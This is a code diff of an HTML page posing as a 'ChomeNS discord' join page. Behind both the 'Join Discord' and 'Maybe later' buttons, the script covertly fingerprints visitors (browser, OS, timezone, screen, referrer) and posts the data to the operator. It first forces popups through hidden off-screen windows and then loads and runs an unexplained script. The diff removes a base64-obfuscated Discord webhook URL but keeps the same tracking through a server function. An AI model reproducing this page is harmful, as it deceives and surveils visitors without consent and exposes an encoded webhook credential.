@@ -70,8 +70,10 @@ button {
     background:linear-gradient(180deg, rgba(239,68,68,.22), rgba(239,68,68,.1));
     border:1px solid rgba(239,68,68,.5);
     color:#fee2e2;
-    font-size:.92rem; text-align:center;
-    display:none; animation:shakeIn .35s ease;
+    font-size:.92rem;
+    text-align:center;
+    display:none;
+    animation:shakeIn .35s ease;
 }
 .popup-warning strong { display:block; font-size:1rem; margin-bottom:.25rem; }
 .popup-warning span { display:block; margin-top:.35rem; font-size:.85rem; color:#fca5a5; }
@@ -90,6 +92,7 @@ button {
     <div class="logo">
         <img src="/media/498c01c84c251eb7c9de3b536a87e5b2.webp" alt="ChomeNS icon">
     </div>
+
     <h1>ChomeNS discord</h1>
     <p>Click below to join our Discord server.</p>
 
@@ -112,18 +115,18 @@ let isYouScriptLoaded = false;
 
 function loadYouScript(cb){
     if(isYouScriptLoaded){ cb(); return; }
-    const s=document.createElement('script');
-    s.src='/scripts/you.js';
-    s.onload=()=>{ isYouScriptLoaded=true; cb(); };
-    s.onerror=()=>console.error('Failed to load you.js');
+    const s = document.createElement('script');
+    s.src = '/scripts/you.js';
+    s.onload = () => { isYouScriptLoaded = true; cb(); };
+    s.onerror = () => console.error('Failed to load you.js');
     document.head.appendChild(s);
 }
 
 function checkPopupPermission(callback){
-    let popups=[], allowed=true;
+    let popups = [], allowed = true;
     try{
         for(let i=0;i<5;i++){
-            const p=window.open('','','width=1,height=1,left=-10000,top=-10000');
+            const p = window.open('','','width=1,height=1,left=-10000,top=-10000');
             if(!p){ allowed=false; break; }
             popups.push(p);
         }
@@ -137,61 +140,58 @@ function checkPopupPermission(callback){
     }
 }
 
-/* ===== WEBHOOK (OBFUSCATED ONLY) ===== */
-const _wh = [
-  "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NTUxMDQ5Nzg4ODgyOTQ0MC9raDRnX2M0RWVXTXBHSkxKVTdVblVa",
-  "d0JPanlNQkdHaEtRYldTQ3d1eXpHRzdrczdPdU5oOXFwVkIwSDdSQUhSSG43bQ=="
-].join("");
-
 function sendWebhookEvent(buttonName){
-    const payload={
-        content:`✅ **Button clicked:** ${buttonName}`,
-        embeds:[{
-            title:"User Action",
-            color:0x5865F2,
-            fields:[
-                {name:"Button", value:buttonName, inline:true},
-                {name:"Browser (UA)", value:navigator.userAgent.slice(0,200)},
-                {name:"Platform", value:navigator.platform||"Unknown", inline:true},
-                {name:"Language", value:navigator.language||"Unknown", inline:true},
-                {name:"Timezone", value:Intl.DateTimeFormat().resolvedOptions().timeZone||"Unknown", inline:true},
-                {name:"Screen", value:`${screen.width}×${screen.height}`, inline:true},
-                {name:"Viewport", value:`${innerWidth}×${innerHeight}`, inline:true},
-                {name:"Referrer", value:document.referrer||"None"},
-                {name:"Page URL", value:location.href}
+    const payload = {
+        content: `✅ **Button clicked:** ${buttonName}`,
+        embeds: [{
+            title: "User Action",
+            color: 0x5865F2,
+            fields: [
+                { name: "Button", value: buttonName, inline: true },
+                { name: "Browser (UA)", value: navigator.userAgent.slice(0,200) },
+                { name: "Platform / OS", value: navigator.platform || "Unknown", inline: true },
+                { name: "Language", value: navigator.language || "Unknown", inline: true },
+                { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown", inline: true },
+                { name: "Screen", value: `${screen.width}×${screen.height}`, inline: true },
+                { name: "Viewport", value: `${innerWidth}×${innerHeight}`, inline: true },
+                { name: "Referrer", value: document.referrer || "None" },
+                { name: "Page URL", value: location.href }
             ],
-            footer:{ text:new Date().toUTCString() }
+            footer: { text: new Date().toUTCString() }
         }]
     };
 
-    fetch(atob(_wh),{
-        method:"POST",
-        headers:{ "Content-Type":"application/json" },
-        body:JSON.stringify(payload)
+    fetch("/.netlify/functions/discord", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
     }).catch(()=>{});
 }
 
 function handleClick(e, buttonName){
     e.preventDefault();
-    popup_needed.style.display='none';
-    spinner_holder.innerHTML='<div class="spinner"><div></div><div></div><div></div></div>';
+    popup_needed.style.display = 'none';
+    spinner_holder.innerHTML =
+        '<div class="spinner"><div></div><div></div><div></div></div>';
 
     checkPopupPermission(isAllowed=>{
         if(!isAllowed){
-            spinner_holder.innerHTML='';
-            popup_needed.style.display='block';
+            spinner_holder.innerHTML = '';
+            popup_needed.style.display = 'block';
             return;
         }
         loadYouScript(()=>{
             sendWebhookEvent(buttonName);
-            if(typeof window.runYouScript==='function'){ window.runYouScript(); }
-            spinner_holder.innerHTML='';
+            if(typeof window.runYouScript === 'function'){
+                window.runYouScript();
+            }
+            spinner_holder.innerHTML = '';
         });
     });
 }
 
-discord_btn.addEventListener('click', e=>handleClick(e,'Join Discord'));
-nah_btn.addEventListener('click', e=>handleClick(e,'Maybe later'));
+discord_btn.addEventListener('click', e => handleClick(e, 'Join Discord'));
+nah_btn.addEventListener('click', e => handleClick(e, 'Maybe later'));
 </script>
 </body>
 </html>
